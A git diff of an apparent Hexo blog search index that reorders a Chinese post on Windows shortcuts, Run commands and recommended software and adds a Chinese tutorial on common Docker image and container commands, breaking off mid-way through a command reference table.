@@ -1,124 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Basics</title>
-    <url>/2023/07/26/Basics/</url>
-    <content><![CDATA[<h1 id="Windows基础"><a href="#Windows基础" class="headerlink" title="Windows基础"></a>Windows基础</h1><span id="more"></span>
-
-<h3 id="一-使用-Linux-和-Windows-文件和目录时，可能需要调整区分大小写的处理方式。"><a href="#一-使用-Linux-和-Windows-文件和目录时，可能需要调整区分大小写的处理方式。" class="headerlink" title="一.使用 Linux 和 Windows 文件和目录时，可能需要调整区分大小写的处理方式。"></a>一.使用 Linux 和 Windows 文件和目录时，可能需要调整区分大小写的处理方式。</h3><p>标准行为：<br>Windovws 文件系统将文件和目录名称视为不区分大小写。 FOO.txt 和 foo.txt 将被视为等效文件。<br>Linux 文件系统将文件和目录名称视为区分大小写。 FOO.txt 和 foo.txt 将被视为不同文件。</p>
-<p>Windows 文件系统支持使用属性标志按目录设置区分大小写。 虽然标准行为是不区分大小写，但你可以分配属性标志来使目录区分大小写，以便它能够识别可能仅大小写不同的 Linux 文件和文件夹。<br>在将驱动器装载到适用于 Linux 的 Windows 子系统 (WSL) 文件系统时，尤其如此。 在 WSL 文件系统中工作时，运行的是 Linux，因此默认情况下，文件和目录被视为区分大小写。</p>
-<h3 id="二、Windows-常用快捷键"><a href="#二、Windows-常用快捷键" class="headerlink" title="二、Windows 常用快捷键"></a>二、Windows 常用快捷键</h3><blockquote>
-<p>1 保存 Ctrl + S 必用<br>2 复制 Ctrl + C<br>3 粘贴 Ctrl + V<br>4 剪切 Ctrl + X<br>5 撤销 Ctrl + Z<br>6 全选 Ctrl + A<br>7 显示桌面 Win + D<br>8 打开资源管理器（此电脑） Win + E<br>9 关闭窗口、浏览器标签 Ctrl + W<br>10 切换打开的程序窗口 Alt + Tab<br>11 新建文件夹 Ctrl + Shift + N<br>12 刷新 Ctrl + R<br>13【浏览器快捷键】恢复 Chrome 中刚被关掉的网页Ctrl + Shift + T<br>14【浏览器快捷键】地址栏搜索Ctrl + E<br>15【浏览器快捷键】全选地址栏内容Ctrl + L<br>16【浏览器快捷键】标签之间切换 Ctrl + Tab<br>17 删除文件（进回收站） Ctrl + D<br>18 彻底删除文件 Shift + Delete<br>19 打开任务管理器 Ctrl + Shift + Esc<br>20 锁定计算机 Win + L<br>21 打印 Ctrl + P<br>22 投影 Win + P<br>23 打开 Windows 常用功能列表 Win + X</p>
-</blockquote>
-<h3 id="三、Windows-运行命令"><a href="#三、Windows-运行命令" class="headerlink" title="三、Windows 运行命令"></a>三、Windows 运行命令</h3><table>
-<thead>
-<tr>
-<th align="center">作用</th>
-<th align="center">命令</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">打开运行窗口</td>
-<td align="center">Win + R</td>
-</tr>
-<tr>
-<td align="center">打开运行窗口</td>
-<td align="center">Win + R</td>
-</tr>
-<tr>
-<td align="center">打开控制面板</td>
-<td align="center">control</td>
-</tr>
-<tr>
-<td align="center">打开计算器</td>
-<td align="center">calc</td>
-</tr>
-<tr>
-<td align="center">打开记事本</td>
-<td align="center">notepad</td>
-</tr>
-<tr>
-<td align="center">打开任务管理器</td>
-<td align="center">taskmgr</td>
-</tr>
-<tr>
-<td align="center">打开系统配置</td>
-<td align="center">msconfig</td>
-</tr>
-<tr>
-<td align="center">打开注册表</td>
-<td align="center">regedit</td>
-</tr>
-<tr>
-<td align="center">打开卸载程序界面</td>
-<td align="center">appwiz.cpl</td>
-</tr>
-<tr>
-<td align="center">打开防火墙设置</td>
-<td align="center">firewall.cpl</td>
-</tr>
-<tr>
-<td align="center">打开系统服务</td>
-<td align="center">services.msc</td>
-</tr>
-<tr>
-<td align="center">打开网络连接</td>
-<td align="center">ncpa.cpl</td>
-</tr>
-<tr>
-<td align="center">打开系统属性</td>
-<td align="center">sysdm.cpl</td>
-</tr>
-<tr>
-<td align="center">快速启动任务栏软件</td>
-<td align="center">Win + （1 ~ 9）</td>
-</tr>
-<tr>
-<td align="center">用命令关机</td>
-<td align="center">shutdown -s -t 0</td>
-</tr>
-<tr>
-<td align="center">用命令重启</td>
-<td align="center">shutdown -r -t 0</td>
-</tr>
-<tr>
-<td align="center">炫酷下滑关机</td>
-<td align="center">slideToShutDown(在桌面新建“关机.txt”，在文件里输入 SlideToShutDown，再把 文件名改为“关 机.bat”，双击这个文件，自己看看效果~~~~)</td>
-</tr>
-</tbody></table>
-<h3 id="四、必装软件"><a href="#四、必装软件" class="headerlink" title="四、必装软件"></a>四、必装软件</h3><ol>
-<li><p>Everything：免费，本地硬盘文件极速搜索工具 （必用）<br>官网下载： <a href="https://www.voidtools.com/zh-cn/">https://www.voidtools.com/zh-cn/</a></p>
-</li>
-<li><p>Wox：免费，效率神器 （必用）<br>百度搜索 Wox 下载或官网下载：<a href="https://github.com/Wox-launcher/Wox">https://github.com/Wox-launcher/Wox</a></p>
-</li>
-<li><p>程序员必用：Markdown 工具（Typora 版本：v0.9.86） （必用）</p>
-</li>
-</ol>
-<p>  Markdown 教程：<a href="https://www.runoob.com/markdown/md-tutorial.html">https://www.runoob.com/markdown/md-tutorial.html</a></p>
-<ol start="4">
-<li>Notepad++ ：免费，功能强大的文本编辑器 （常用）</li>
-</ol>
-<p>  官网下载：<a href="https://notepad-plus.en.softonic.com/">https://notepad-plus.en.softonic.com/</a></p>
-<ol start="5">
-<li>VS Code：编程神器，可开发多种语言，多用于前端开发 （常用）</li>
-</ol>
-<p>  官网下载：<a href="https://code.visualstudio.com/">https://code.visualstudio.com/</a></p>
-<ol start="6">
-<li>FDM：免费，非常棒的下载工具</li>
-</ol>
-<p>​       官网下载：<a href="https://www.freedownloadmanager.org/zh/download.htm">https://www.freedownloadmanager.org/zh/download.htm</a></p>
-<ol start="7">
-<li>Chrome、Firefox：程序员用的浏览器，调试 Web 前端 （必用）</li>
-</ol>
-<p>​        百度搜索：Chrome 下载、Firefox 下载</p>
-]]></content>
-      <tags>
-        <tag>Windows常用快捷键</tag>
-        <tag>Windows运行命令</tag>
-        <tag>必备软件</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Docke精髓</title>
     <url>/2023/08/01/Docke3/</url>
     <content><![CDATA[<h1 id="容器数据卷"><a href="#容器数据卷" class="headerlink" title="容器数据卷"></a>容器数据卷</h1><span id="more"></span>
@@ -261,6 +143,124 @@
       </tags>
   </entry>
   <entry>
+    <title>Basics</title>
+    <url>/2023/07/26/Basics/</url>
+    <content><![CDATA[<h1 id="Windows基础"><a href="#Windows基础" class="headerlink" title="Windows基础"></a>Windows基础</h1><span id="more"></span>
+
+<h3 id="一-使用-Linux-和-Windows-文件和目录时，可能需要调整区分大小写的处理方式。"><a href="#一-使用-Linux-和-Windows-文件和目录时，可能需要调整区分大小写的处理方式。" class="headerlink" title="一.使用 Linux 和 Windows 文件和目录时，可能需要调整区分大小写的处理方式。"></a>一.使用 Linux 和 Windows 文件和目录时，可能需要调整区分大小写的处理方式。</h3><p>标准行为：<br>Windovws 文件系统将文件和目录名称视为不区分大小写。 FOO.txt 和 foo.txt 将被视为等效文件。<br>Linux 文件系统将文件和目录名称视为区分大小写。 FOO.txt 和 foo.txt 将被视为不同文件。</p>
+<p>Windows 文件系统支持使用属性标志按目录设置区分大小写。 虽然标准行为是不区分大小写，但你可以分配属性标志来使目录区分大小写，以便它能够识别可能仅大小写不同的 Linux 文件和文件夹。<br>在将驱动器装载到适用于 Linux 的 Windows 子系统 (WSL) 文件系统时，尤其如此。 在 WSL 文件系统中工作时，运行的是 Linux，因此默认情况下，文件和目录被视为区分大小写。</p>
+<h3 id="二、Windows-常用快捷键"><a href="#二、Windows-常用快捷键" class="headerlink" title="二、Windows 常用快捷键"></a>二、Windows 常用快捷键</h3><blockquote>
+<p>1 保存 Ctrl + S 必用<br>2 复制 Ctrl + C<br>3 粘贴 Ctrl + V<br>4 剪切 Ctrl + X<br>5 撤销 Ctrl + Z<br>6 全选 Ctrl + A<br>7 显示桌面 Win + D<br>8 打开资源管理器（此电脑） Win + E<br>9 关闭窗口、浏览器标签 Ctrl + W<br>10 切换打开的程序窗口 Alt + Tab<br>11 新建文件夹 Ctrl + Shift + N<br>12 刷新 Ctrl + R<br>13【浏览器快捷键】恢复 Chrome 中刚被关掉的网页Ctrl + Shift + T<br>14【浏览器快捷键】地址栏搜索Ctrl + E<br>15【浏览器快捷键】全选地址栏内容Ctrl + L<br>16【浏览器快捷键】标签之间切换 Ctrl + Tab<br>17 删除文件（进回收站） Ctrl + D<br>18 彻底删除文件 Shift + Delete<br>19 打开任务管理器 Ctrl + Shift + Esc<br>20 锁定计算机 Win + L<br>21 打印 Ctrl + P<br>22 投影 Win + P<br>23 打开 Windows 常用功能列表 Win + X</p>
+</blockquote>
+<h3 id="三、Windows-运行命令"><a href="#三、Windows-运行命令" class="headerlink" title="三、Windows 运行命令"></a>三、Windows 运行命令</h3><table>
+<thead>
+<tr>
+<th align="center">作用</th>
+<th align="center">命令</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">打开运行窗口</td>
+<td align="center">Win + R</td>
+</tr>
+<tr>
+<td align="center">打开运行窗口</td>
+<td align="center">Win + R</td>
+</tr>
+<tr>
+<td align="center">打开控制面板</td>
+<td align="center">control</td>
+</tr>
+<tr>
+<td align="center">打开计算器</td>
+<td align="center">calc</td>
+</tr>
+<tr>
+<td align="center">打开记事本</td>
+<td align="center">notepad</td>
+</tr>
+<tr>
+<td align="center">打开任务管理器</td>
+<td align="center">taskmgr</td>
+</tr>
+<tr>
+<td align="center">打开系统配置</td>
+<td align="center">msconfig</td>
+</tr>
+<tr>
+<td align="center">打开注册表</td>
+<td align="center">regedit</td>
+</tr>
+<tr>
+<td align="center">打开卸载程序界面</td>
+<td align="center">appwiz.cpl</td>
+</tr>
+<tr>
+<td align="center">打开防火墙设置</td>
+<td align="center">firewall.cpl</td>
+</tr>
+<tr>
+<td align="center">打开系统服务</td>
+<td align="center">services.msc</td>
+</tr>
+<tr>
+<td align="center">打开网络连接</td>
+<td align="center">ncpa.cpl</td>
+</tr>
+<tr>
+<td align="center">打开系统属性</td>
+<td align="center">sysdm.cpl</td>
+</tr>
+<tr>
+<td align="center">快速启动任务栏软件</td>
+<td align="center">Win + （1 ~ 9）</td>
+</tr>
+<tr>
+<td align="center">用命令关机</td>
+<td align="center">shutdown -s -t 0</td>
+</tr>
+<tr>
+<td align="center">用命令重启</td>
+<td align="center">shutdown -r -t 0</td>
+</tr>
+<tr>
+<td align="center">炫酷下滑关机</td>
+<td align="center">slideToShutDown(在桌面新建“关机.txt”，在文件里输入 SlideToShutDown，再把 文件名改为“关 机.bat”，双击这个文件，自己看看效果~~~~)</td>
+</tr>
+</tbody></table>
+<h3 id="四、必装软件"><a href="#四、必装软件" class="headerlink" title="四、必装软件"></a>四、必装软件</h3><ol>
+<li><p>Everything：免费，本地硬盘文件极速搜索工具 （必用）<br>官网下载： <a href="https://www.voidtools.com/zh-cn/">https://www.voidtools.com/zh-cn/</a></p>
+</li>
+<li><p>Wox：免费，效率神器 （必用）<br>百度搜索 Wox 下载或官网下载：<a href="https://github.com/Wox-launcher/Wox">https://github.com/Wox-launcher/Wox</a></p>
+</li>
+<li><p>程序员必用：Markdown 工具（Typora 版本：v0.9.86） （必用）</p>
+</li>
+</ol>
+<p>  Markdown 教程：<a href="https://www.runoob.com/markdown/md-tutorial.html">https://www.runoob.com/markdown/md-tutorial.html</a></p>
+<ol start="4">
+<li>Notepad++ ：免费，功能强大的文本编辑器 （常用）</li>
+</ol>
+<p>  官网下载：<a href="https://notepad-plus.en.softonic.com/">https://notepad-plus.en.softonic.com/</a></p>
+<ol start="5">
+<li>VS Code：编程神器，可开发多种语言，多用于前端开发 （常用）</li>
+</ol>
+<p>  官网下载：<a href="https://code.visualstudio.com/">https://code.visualstudio.com/</a></p>
+<ol start="6">
+<li>FDM：免费，非常棒的下载工具</li>
+</ol>
+<p>​       官网下载：<a href="https://www.freedownloadmanager.org/zh/download.htm">https://www.freedownloadmanager.org/zh/download.htm</a></p>
+<ol start="7">
+<li>Chrome、Firefox：程序员用的浏览器，调试 Web 前端 （必用）</li>
+</ol>
+<p>​        百度搜索：Chrome 下载、Firefox 下载</p>
+]]></content>
+      <tags>
+        <tag>Windows常用快捷键</tag>
+        <tag>Windows运行命令</tag>
+        <tag>必备软件</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>docker</title>
     <url>/2023/07/30/Docker/</url>
     <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><span id="more"></span>
@@ -371,6 +371,245 @@
       </tags>
   </entry>
   <entry>
+    <title>Docker命令</title>
+    <url>/2023/07/31/Docker%E5%91%BD%E4%BB%A4/</url>
+    <content><![CDATA[<h1 id="Docker的常用命令"><a href="#Docker的常用命令" class="headerlink" title="Docker的常用命令"></a>Docker的常用命令</h1><span id="more"></span>
+
+<h2 id="帮助命令"><a href="#帮助命令" class="headerlink" title="帮助命令"></a>帮助命令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker version      #显示docker的版本信息</span><br><span class="line">docker info            #显示docker的系统信息，包括境像和容器的数量</span><br><span class="line">docker 命令 --help# 帮助命令</span><br><span class="line"></span><br><span class="line">帮助文档的地址：https://docs.docker.com/engine/reference/commandline</span><br></pre></td></tr></table></figure>
+
+<h2 id="镜像命令"><a href="#镜像命令" class="headerlink" title="镜像命令"></a>镜像命令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images 查看所有本地的主机上的镜像</span><br><span class="line">[root@xxx /]# docker images</span><br><span class="line">REPOSITORY			TAG	    	IMAGE ID		      CREATED	         	SIZE</span><br><span class="line">he11o-world			Tatest		bf756fblae65		4 months ago		13.3kB</span><br><span class="line"></span><br><span class="line">解释</span><br><span class="line">REPOSITORY    镜像的仓库源</span><br><span class="line">TAG		      	 镜像的标签</span><br><span class="line">IMAGE ID		  镜像的id</span><br><span class="line">CREATED		  镜像的创建时间</span><br><span class="line">SIZE					镜像的大小</span><br><span class="line"></span><br><span class="line">#可选项</span><br><span class="line">-a，--all						   列出所有镜像</span><br><span class="line">-q，--quiet  				    只显示ID</span><br></pre></td></tr></table></figure>
+
+<h3 id="docker-search-搜索镜像"><a href="#docker-search-搜索镜像" class="headerlink" title="docker search 搜索镜像"></a>docker search 搜索镜像</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@xxx /]# docker search mysql</span><br><span class="line">NAME                            DESCRIPTION                                                    STARS     OFFICIAL   AUTOMATED</span><br><span class="line">mysql                 MySQL is a widely used, open-source relation…    14338        [OK]       </span><br><span class="line">mariadb             MariaDB Server is a high performing open sou…   5474         [OK]       </span><br><span class="line"></span><br><span class="line">#可选项，通过搜藏来过滤</span><br><span class="line">--filter=STARS=3000# 搜索出来的镜像就是STARS大于3000的</span><br><span class="line"></span><br><span class="line">[root@xxx ~]# docker search mysql --filter=STARS=3000</span><br><span class="line">NAME        					 DESCRIPTION                              			  STARS     OFFICIAL   AUTOMATED</span><br><span class="line">mysql     MySQL is a widely used, open-source relation…   	14338     [OK]       </span><br><span class="line">mariadb   MariaDB Server is a high performing open sou…    5474      [OK]       </span><br></pre></td></tr></table></figure>
+
+<h3 id="拉取镜像docker-pull-镜像名-tag"><a href="#拉取镜像docker-pull-镜像名-tag" class="headerlink" title="拉取镜像docker pull 镜像名[:tag]"></a><strong>拉取镜像docker pull 镜像名[:tag]</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@163 ~]# docker pull mysql</span><br><span class="line">Using default tag: latest  #如果不写tag，默认最新版本</span><br><span class="line">latest: Pulling from library/mysql</span><br><span class="line">72a69066d2fe: Pull complete 		#分层下载，docker  image的核心  联合文件系统</span><br><span class="line">93619dbc5b36: Pull complete </span><br><span class="line">99da31dd6142: Pull complete </span><br><span class="line">626033c43d70: Pull complete </span><br><span class="line">37d5d7efb64e: Pull complete </span><br><span class="line">ac563158d721: Pull complete </span><br><span class="line">d2ba16033dad: Pull complete </span><br><span class="line">688ba7d5c01a: Pull complete </span><br><span class="line">00e060b6d11d: Pull complete </span><br><span class="line">1c04857f594f: Pull complete </span><br><span class="line">4d7cfa90e6ea: Pull complete </span><br><span class="line">e0431212d27d: Pull complete </span><br><span class="line">Digest: sha256:e9027fe4d91c0153429607251656806cc784e914937271037f7738bd5b8e7709  #签名</span><br><span class="line">Status: Downloaded newer image for mysql:latest</span><br><span class="line">docker.io/library/mysql:latest	#真实地址</span><br><span class="line"></span><br><span class="line">*docker pull mysql等价于docker pull docker.io/library/mysql:latest</span><br><span class="line"></span><br><span class="line">*docker pull mysql:5.7</span><br><span class="line">[root@163 ~]# docker pull mysql:5.7</span><br><span class="line">5.7: Pulling from library/mysql</span><br><span class="line">72a69066d2fe: Already exists </span><br><span class="line">93619dbc5b36: Already exists </span><br><span class="line">99da31dd6142: Already exists </span><br><span class="line">626033c43d70: Already exists </span><br><span class="line">37d5d7efb64e: Already exists </span><br><span class="line">ac563158d721: Already exists </span><br><span class="line">d2ba16033dad: Already exists //以上为重复部分</span><br><span class="line">0ceb82207cd7: Pull complete </span><br><span class="line">37f2405cae96: Pull complete </span><br><span class="line">e2482e017e53: Pull complete </span><br><span class="line">70deed891d42: Pull complete </span><br><span class="line">Digest: sha256:f2ad209efe9c67104167fc609cca6973c8422939491c9345270175a300419f94</span><br><span class="line">Status: Downloaded newer image for mysql:5.7</span><br><span class="line">docker.io/library/mysql:5.7</span><br></pre></td></tr></table></figure>
+
+<h3 id="删除镜像docker-rmi"><a href="#删除镜像docker-rmi" class="headerlink" title="删除镜像docker rmi"></a>删除镜像docker rmi</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker rmi -f   镜像ID			 //删除指定镜像</span><br><span class="line"></span><br><span class="line">docker rmi -f   镜像ID 镜像ID 镜像ID //删除多个镜像</span><br><span class="line"></span><br><span class="line">docker rmi -f  $(docker images -aq)	  //删除所有镜像</span><br></pre></td></tr></table></figure>
+
+<h2 id="容器命令"><a href="#容器命令" class="headerlink" title="容器命令"></a>容器命令</h2><p><strong>说明:我们有了镜像才可以创建容器，linux，下载一个 centos 镜像来测试学习</strong><br>docker pull centos</p>
+<h3 id="新建容器并启动"><a href="#新建容器并启动" class="headerlink" title="新建容器并启动"></a>新建容器并启动</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run [可选参数] image</span><br><span class="line"></span><br><span class="line">#参数说明</span><br><span class="line">--name=&quot;Name&quot;		   容器名字 tomcat01 tomcat02，用来区分容器</span><br><span class="line">-d									后台方式运行</span><br><span class="line">-it									使用交互方式运行，进入容器查看内容</span><br><span class="line"></span><br><span class="line">-p								   指定容器的端口-p  8080:8080</span><br><span class="line"></span><br><span class="line">     	 	-p ip:主机端口:容器端口</span><br><span class="line">			-p 主机端口:容器端口 (常用)</span><br><span class="line">			-p 容器端口</span><br><span class="line">			容器端口</span><br><span class="line"></span><br><span class="line">-P								   随机指定端口</span><br><span class="line"></span><br><span class="line">#测试，启动并进入容器</span><br><span class="line"></span><br><span class="line">[root@xxx ~]# docker run -it centos /bin/bash</span><br><span class="line"></span><br><span class="line">[root@c0eed8b69c30 /]# ls   //查看容器内的centos,基础版本，很多命令都不完善</span><br><span class="line">bin  etc   lib	  lost+found  mnt  proc  run   srv  tmp  var	</span><br><span class="line">dev  home  lib64  media       opt  root  sbin  sys  usr</span><br><span class="line"></span><br><span class="line">exit		//从容器中退回主机</span><br></pre></td></tr></table></figure>
+
+<h3 id="列出所有运行的容器"><a href="#列出所有运行的容器" class="headerlink" title="列出所有运行的容器"></a>列出所有运行的容器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#docker ps 命令</span><br><span class="line">     	列出当前正在运行的容器</span><br><span class="line"></span><br><span class="line">-a 		//列出当前正在运行的容器+带出历史运行过的容器</span><br><span class="line">-n=? 	// 显示最近创建的容器</span><br><span class="line">-q		//只显示容器的编号</span><br></pre></td></tr></table></figure>
+
+<h3 id="退出容器"><a href="#退出容器" class="headerlink" title="退出容器"></a>退出容器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exit 				   //直接容器停止并退出  </span><br><span class="line"></span><br><span class="line">Ctrl + P + Q 	//容不停止退出</span><br></pre></td></tr></table></figure>
+
+<h3 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker rm 容器id		//删除指定的容器，不能除正在运行的容器，如果要强制刚除 rm -f</span><br><span class="line">docker rm -f $(docker ps -aq)		//删除所有的容器</span><br><span class="line">docker ps -a -q|xargs docker rm 		// 删除所有的容器</span><br></pre></td></tr></table></figure>
+
+<h3 id="启动和停止容器的操作"><a href="#启动和停止容器的操作" class="headerlink" title="启动和停止容器的操作"></a>启动和停止容器的操作</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker start 容器id			启动容器</span><br><span class="line">docker restart 容器id		重启容器</span><br><span class="line">docker stop 容器id			停止当前正在运行的容器</span><br><span class="line">docker kill 容器id			  强制停止当前容器</span><br></pre></td></tr></table></figure>
+
+<h2 id="常用其他命令"><a href="#常用其他命令" class="headerlink" title="常用其他命令"></a>常用其他命令</h2><p><strong>后台启动容器</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#命令 docker run -d 镜像名!</span><br><span class="line"></span><br><span class="line">[root@xxx /]# docker run -d centos</span><br><span class="line"></span><br><span class="line">#问题docker ps，发现 centos 停止了</span><br><span class="line"></span><br><span class="line">#常见的坑:docker 容器使用后台运行，就必须要有要一个前台进程，docker发现没有应用，就会自动停止</span><br><span class="line"></span><br><span class="line">#nginx，容器启动后，发现自己没有提供服务，就会立刻停止，就是没有程序了</span><br></pre></td></tr></table></figure>
+
+<p><strong>查看日志</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker logs -f -t --tail 容器，没有日志</span><br><span class="line"></span><br><span class="line">#自己编写一段shell脚本</span><br><span class="line"></span><br><span class="line">[root@xxx /]# docker run -d centos /bin/sh -c &quot;while true;do echo hhhhhh;sleep 1;done&quot;</span><br><span class="line"></span><br><span class="line">[root@xxx /]# docker ps</span><br><span class="line"></span><br><span class="line">CONTAINER ID			IMAGE</span><br><span class="line">dce7b86171bf			centos</span><br><span class="line"></span><br><span class="line">#显示日志</span><br><span class="line"></span><br><span class="line">-tf								//显示日志</span><br><span class="line"></span><br><span class="line">--tai1 number			//要显示日志条数</span><br><span class="line"></span><br><span class="line">[root@xxx /]# docker logs -tf --tai1 10 dce7b86171bf</span><br></pre></td></tr></table></figure>
+
+<p><strong>查看容器中进程信息</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#docker ps</span><br><span class="line">#命令docker top 容器id</span><br><span class="line">UID                 PID                 PPID        	    C                 STIME       </span><br><span class="line">root                1432624             1432594             0                   20:14     </span><br><span class="line">root                1452486             1432624             0                   20:20     </span><br></pre></td></tr></table></figure>
+
+<p><strong>查看镜像的元数据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#命令 docker inspect 容器id</span><br></pre></td></tr></table></figure>
+
+<p><strong>进入当前正在运行的容器</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">方式一：docker exec -it 容器id /bin/bash		//进入容器后开启一个新的终端，可以在里面操作</span><br><span class="line"></span><br><span class="line">方式二：docker attach 容器id		 				 //进入容器正在执行的终端，不会启动新的进程</span><br></pre></td></tr></table></figure>
+
+<p><strong>从容器内拷贝文件到主机上</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker  cp 容器id:容器内路径  目的的主机路径</span><br><span class="line"></span><br><span class="line">#查看当将主机目录下</span><br><span class="line"></span><br><span class="line">[root@163 home]# ls</span><br><span class="line">hhh.java  redis  www</span><br><span class="line">[root@163 home]#  docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND       CREATED         STATUS         PORTS     NAMES</span><br><span class="line">69687a39e545   centos    &quot;/bin/bash&quot;   2 minutes ago   Up 2 minutes             vigilant_blackburn</span><br><span class="line"></span><br><span class="line">#进入docker容器内部</span><br><span class="line"></span><br><span class="line">[root@163 home]# docker attach 69687a39e545</span><br><span class="line">[root@69687a39e545 /]# cd /home</span><br><span class="line">[root@69687a39e545 home]# ls</span><br><span class="line"></span><br><span class="line">#在容器内新建一个文件</span><br><span class="line"></span><br><span class="line">[root@69687a39e545 home]# touch test.java</span><br><span class="line">[root@69687a39e545 home]# exit</span><br><span class="line">exit</span><br><span class="line">[root@163 home]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES</span><br><span class="line">[root@163 home]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND       CREATED         STATUS                      PORTS     NAMES</span><br><span class="line">69687a39e545   centos    &quot;/bin/bash&quot;   4 minutes ago   Exited (0) 31 seconds ago             vigilant_blackburn</span><br><span class="line"></span><br><span class="line">#将文件拷贝出来到主机上</span><br><span class="line"></span><br><span class="line">[root@163 home]# docker cp 69687a39e545:/home/test.java /home</span><br><span class="line">Successfully copied 1.54kB to /home</span><br><span class="line">[root@163 home]# ls</span><br><span class="line">hhh.java  redis  test.java  www</span><br><span class="line"></span><br><span class="line">#拷贝是一个手动过程，使用-v卷的技术可以实现</span><br></pre></td></tr></table></figure>
+
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p><img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230730205339571.png" alt="image-20230730205339571"></p>
+<table>
+<thead>
+<tr>
+<th align="center">attach</th>
+<th align="center">Attach to a running container</th>
+<th align="center">当前 she11 下 attach 连接指定运行镜像</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">build</td>
+<td align="center">Build an imagerfrom a Dockerfile</td>
+<td align="center">通过 Dockerfile 定制镜像</td>
+</tr>
+<tr>
+<td align="center">commit</td>
+<td align="center">Create a new image from a container changes</td>
+<td align="center">提交当前容器为新的镜像</td>
+</tr>
+<tr>
+<td align="center">cp</td>
+<td align="center">Copy files&#x2F;folders from the containers filesystem to the host path</td>
+<td align="center">从容器中搏贝指定文件或者目录到宿主机中</td>
+</tr>
+<tr>
+<td align="center">create</td>
+<td align="center">Create a new container</td>
+<td align="center">创建一个新的容器，同 run，但不启动容器</td>
+</tr>
+<tr>
+<td align="center">diff</td>
+<td align="center">Inspect changes on a container’s fiesystem</td>
+<td align="center">查看 docker 容器变化</td>
+</tr>
+<tr>
+<td align="center">events</td>
+<td align="center">Get real time events from the server</td>
+<td align="center">从 docker 服务获取容器实时事件</td>
+</tr>
+<tr>
+<td align="center">exec</td>
+<td align="center">Run a command in an existing container</td>
+<td align="center">在已存在的容器上运行命令</td>
+</tr>
+<tr>
+<td align="center">export</td>
+<td align="center">Stream the contents of a container as a tar archive</td>
+<td align="center">导出容器的内容作为一个 tar 归档文件[对应import]</td>
+</tr>
+<tr>
+<td align="center">history</td>
+<td align="center">Show the history of an image</td>
+<td align="center">展示一个镜像形成历史</td>
+</tr>
+<tr>
+<td align="center">images</td>
+<td align="center">List images</td>
+<td align="center">列出系统当前镜像</td>
+</tr>
+<tr>
+<td align="center">import</td>
+<td align="center">Create a new filesystem image from the contents of a tarball</td>
+<td align="center">从tar包中的内容创建一个新的文件系统映像[对应export]</td>
+</tr>
+<tr>
+<td align="center">info</td>
+<td align="center">Display system-wide information</td>
+<td align="center">显示系统相关信息</td>
+</tr>
+<tr>
+<td align="center">inspect</td>
+<td align="center">Return low-Tevel information on a container</td>
+<td align="center">查看容器详细信息</td>
+</tr>
+<tr>
+<td align="center">kill</td>
+<td align="center">Kill a running container</td>
+<td align="center">kill 指定 docker 容器</td>
+</tr>
+<tr>
+<td align="center">load</td>
+<td align="center">Load an image from a tar archive</td>
+<td align="center">从一个 tar 包中加载一个像[对应 save]</td>
+</tr>
+<tr>
+<td align="center">login</td>
+<td align="center">Register or Login to the docker registry server</td>
+<td align="center">注册或者陆一个 docker 源服务器</td>
+</tr>
+<tr>
+<td align="center">logout</td>
+<td align="center">Log out from a Docker registry server</td>
+<td align="center">从当前 Docker registry 退出</td>
+</tr>
+<tr>
+<td align="center">logs</td>
+<td align="center">Fetch the logs of a container</td>
+<td align="center">输出当前容器日志信息</td>
+</tr>
+<tr>
+<td align="center">port</td>
+<td align="center">Lookup the public-facing port which is NAT-ed to PRIVATE_PORT</td>
+<td align="center">查看映射端口对应的容器内部源端口</td>
+</tr>
+<tr>
+<td align="center">pause</td>
+<td align="center">Pause all processes within a container</td>
+<td align="center">暂停容器</td>
+</tr>
+<tr>
+<td align="center">ps</td>
+<td align="center">List containers</td>
+<td align="center">列出容器列表</td>
+</tr>
+<tr>
+<td align="center">pull</td>
+<td align="center">Pull an image or a repository from the docker registry server</td>
+<td align="center">从docker镜像源服务器拉取指定镜像或者库镜像</td>
+</tr>
+<tr>
+<td align="center">push</td>
+<td align="center">Push an image or a repository to the docker registry server</td>
+<td align="center">推送指定镜像或者库镜像至docker源服务器</td>
+</tr>
+<tr>
+<td align="center">restart</td>
+<td align="center">Restart a running container</td>
+<td align="center">重启运行的容器</td>
+</tr>
+<tr>
+<td align="center">rm</td>
+<td align="center">Remove one or more containers</td>
+<td align="center">移除一个或者多个容器</td>
+</tr>
+<tr>
+<td align="center">rmi</td>
+<td align="center">Remove one or more images</td>
+<td align="center">移除一个或多个镜像[无容器使用该镜像才可删除，否则需删除相关容器才可继续或 -f 强制删除]</td>
+</tr>
+<tr>
+<td align="center">run</td>
+<td align="center">Run a command in a new container</td>
